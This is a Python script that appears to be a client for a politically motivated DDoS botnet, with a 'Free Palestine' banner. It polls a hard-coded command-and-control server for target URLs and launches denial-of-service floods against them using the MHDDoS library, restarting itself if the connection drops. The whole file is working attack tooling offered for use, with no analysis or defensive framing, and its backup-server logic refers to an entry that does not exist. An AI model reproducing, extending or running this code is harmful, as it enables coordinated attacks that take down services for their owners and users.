palestine_text = """
\033[91m ____       _           _   _ \033[0m
\033[91m|  _ \\ __ _| | ___  ___| |_(_)_ __   ___\033[0m
\033[97m| |_) / _` | |/ _ \\/ __| __| | '_ \\ / _ \\\033[0m
\033[92m|  __/ (_| | |  __/\\__ \\ |_| | | | |  __/\033[0m
\033[32m|_|   \\__,_|_|\\___||___/\\__|_|_| |_|\\___|\033[0m

\033[91mF\033[91mR\033[91mE\033[97mE \033[92mP\033[92mA\033[92mL\033[92mE\033[91mS\033[91mT\033[92mA\033[92mI\033[91mN\033[91mE\033[0m
"""

import requests
from mhddos import runner
import time
import threading
import os
import sys
import schedule  # Import the schedule library


class ThreadManager:
    def __init__(self):
        self.threads = []

    def add_thread(self, thread):
        self.threads.append(thread)

    def stop_all_threads(self):
        for thread in self.threads:
            thread.join()

class AttackController:
    def __init__(self, target_url):
        self.target_url = target_url
        self.attack_thread = None

    def start_attack(self):
        if self.attack_thread is None or not self.attack_thread.is_alive():
            self.attack_thread = threading.Thread(target=self._run_attack)
            self.attack_thread.start()
            print("Attack started!")

    def stop_attack(self):
        if self.attack_thread and self.attack_thread.is_alive():
            self.attack_thread.join()
            print("Attack stopped!")

    def _run_attack(self):
        # Perform the specified attack
        runner.run(self.target_url)
        # Add additional conditions for other attack types if needed
        print("Attack completed!")

# Rest of the code remains unchanged

print(palestine_text)

base_urls = ["http://128.140.126.18:5000"]  # Replace with your actual base URLs
current_target = None  # Variable to store the current target
thread_manager = ThreadManager()  # Thread manager to keep track of threads

def stop():
    # Stop all threads before cleanup
    thread_manager.stop_all_threads()
    # Add logic to stop the MHDDoS job or perform any necessary cleanup
    print("Stopping the current job")

def hi():
    try:
        # Run the hi function every 1 minute
        response = requests.get(f"{base_urls[0]}/hi/").json()
        if response["status"] == "ok":
            print("Hi request successful!")
    except requests.ConnectionError as e:
        print(f"Exception: {e}")
        print(f"Restarting the script...")
        python = sys.executable
        os.execl(python, python, *sys.argv)

schedule.every(1).minutes.do(hi)


def ping(base_url, attack_controller):
    global current_target
    try:
        # Run this function every 5 seconds to check for new jobs
        response = requests.get(f"{base_url}/ping/").json()

        if response["prioritize"]:
            new_target = get_target(base_url)
            if new_target != current_target:
                stop()
                print(new_target)
                # Start the work function in a separate thread
                thread = threading.Thread(target=work, args=(new_target, attack_controller))
                thread_manager.add_thread(thread)
                thread.start()
        else:
            # Check if the first server is available
            if is_server_available(base_urls[0]):
                new_target = get_target(base_urls[0])
                if new_target != current_target:
                    stop()
                    print(new_target)
                    # Start the work function in a separate thread
                    thread = threading.Thread(target=work, args=(new_target, attack_controller))
                    thread_manager.add_thread(thread)
                    thread.start()
            else:
                print(f"Server {base_urls[0]} not available. Switching to backup server.")
                new_target = get_target(base_urls[1])
                if new_target != current_target:
                    stop()
                    print(new_target)
                    # Start the work function in a separate thread
                    thread = threading.Thread(target=work, args=(new_target, attack_controller))
                    thread_manager.add_thread(thread)
                    thread.start()
    except requests.ConnectionError as e:
        print(f"Exception: {e}")
        print(f"Restarting the script...")
        python = sys.executable
        os.execl(python, python, *sys.argv)

def is_server_available(base_url):
    try:
        # Try sending a request to check server availability
        response = requests.get(f"{base_url}/ping/")
        return response.status_code == 200
    except requests.ConnectionError:
        return False

def get_target(base_url):
    # Fetch the job details from the server
    target = requests.get(f"{base_url}/get_job/").json()
    return target

def work(target, attack_controller):
    global current_target
    current_target = target
    # Perform the specified job based on job_type
    attack_controller.start_attack()
    # Add additional conditions for other job types if needed

def pending():
    while True:
        schedule.run_pending()
        time.sleep(1)


# Add a loop to run the ping function for each base URL every 5 seconds
if __name__ == "__main__":
    try:
        thread = threading.Thread(target=pending, name="Pending stuff")
        thread.start()
        while True:
            for base_url in base_urls:
                target_url = get_target(base_url)["url"]
                attack_controller = AttackController(target_url)
                ping(base_url, attack_controller)

                
            time.sleep(5)  # Sleep for 5 seconds before the next iteration

    except KeyboardInterrupt:
        exit(2)
